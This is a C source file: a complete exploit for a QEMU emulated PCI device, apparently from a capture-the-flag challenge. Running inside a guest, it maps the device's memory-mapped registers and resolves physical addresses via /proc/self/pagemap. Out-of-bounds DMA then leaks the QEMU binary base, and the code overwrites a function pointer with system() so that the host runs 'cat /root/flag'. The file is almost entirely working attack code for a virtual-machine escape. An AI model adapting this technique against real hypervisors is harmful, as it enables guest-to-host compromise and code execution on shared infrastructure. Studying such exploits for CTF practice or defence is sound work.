#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd, mmio_fd;
void *mmio_mem;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    size_t offset;

    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;

    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int init_mmio() {

    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0) {
        perror("open pci");
        return -1;
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem < 0) {
        perror("mmap mmio_mem");
        return -1;
    }
    printf("mmio_mem: 0x%lx\n", (size_t) mmio_mem);

    return 0;
}

uint64_t mmio_read(uint64_t addr) {
    return *(uint64_t *)((uint8_t *) mmio_mem + addr);
}

void mmio_write(uint64_t addr, uint64_t val) {
    *(uint64_t *)((uint8_t *) mmio_mem + addr) = val;
}

/* MMIO */
void set_dma_src(uint64_t val) {
    mmio_write(0x80, val);
}

void set_dma_dst(uint64_t val) {
    mmio_write(0x88, val);
}

void set_dma_cnt(uint64_t val) {
    mmio_write(0x90, val);
}

uint8_t ENABLE_DMA = 0b001;
uint8_t IS_WRITE = 0b010;
uint8_t ENCRYPTED = 0b100;

void set_dma_cmd(uint64_t val) {
    mmio_write(0x98, val);
}

void disable_dma() {
    set_dma_cmd(!ENABLE_DMA);
}

void dma_write(uint64_t src, uint64_t dst, uint64_t cnt) {
    set_dma_src(src);
    set_dma_dst(dst);
    set_dma_cnt(cnt);
    set_dma_cmd(ENABLE_DMA | IS_WRITE | !ENCRYPTED);
    sleep(1);
    disable_dma();
}

void dma_read(uint64_t src, uint64_t dst, uint64_t cnt) {
    set_dma_src(src);
    set_dma_dst(dst);
    set_dma_cnt(cnt);
    set_dma_cmd(ENABLE_DMA | !IS_WRITE | !ENCRYPTED);
    sleep(1);
    disable_dma();
}

int main() {
    int r = 0;
    void *userbuf;
    uint64_t phy_userbuf;

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (!fd) {
        perror("open pagemap");
        return -1;
    }

    /* init MMIO */
    r = init_mmio();
    if (r == -1) {
        perror("init mmio");
        return -1;
    }

    /* allocate a user buffer */
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED) {
        perror("mmap userbuf");
        return -1;
    }
    mlock(userbuf, 0x1000);
    phy_userbuf = gva_to_gpa(userbuf);
    printf("userbuf: 0x%lx\n", (uint64_t) userbuf);
    printf("phy_userbuf: 0x%lx\n", phy_userbuf);

    /* for DEBUG: 
     * (ASLR off)
     * QEMU mapping base: 0x007fffebe00000
     * HitbState base: 0x555557f97010
     **/
    /* leak binary base */
    uint64_t BASE = 0x40000;
    dma_write(BASE + 0x1000, (uint64_t) phy_userbuf, 0x8);
    uint64_t binary_base = *(uint64_t *) userbuf - 0x283dd0;
    printf("binary_base: 0x%lx\n", binary_base);
    uint64_t system_plt = binary_base + 0x1fdb18;
    printf("system_plt: 0x%lx\n", system_plt);

    /* overwrite ptr */
    char cmd[] = "cat /root/flag";
    memcpy(userbuf, cmd, strlen(cmd) + 1);
    dma_read((uint64_t) phy_userbuf, BASE, strlen(cmd) + 1);
    memcpy(userbuf, (uint8_t *) &system_plt, 8);
    dma_read((uint64_t) phy_userbuf, BASE + 0x1000, 0x8);

    /* get shell */
    set_dma_src(BASE);
    set_dma_cmd(ENABLE_DMA | IS_WRITE | ENCRYPTED);

    close(fd);
    close(mmio_fd);

    return 0;
}
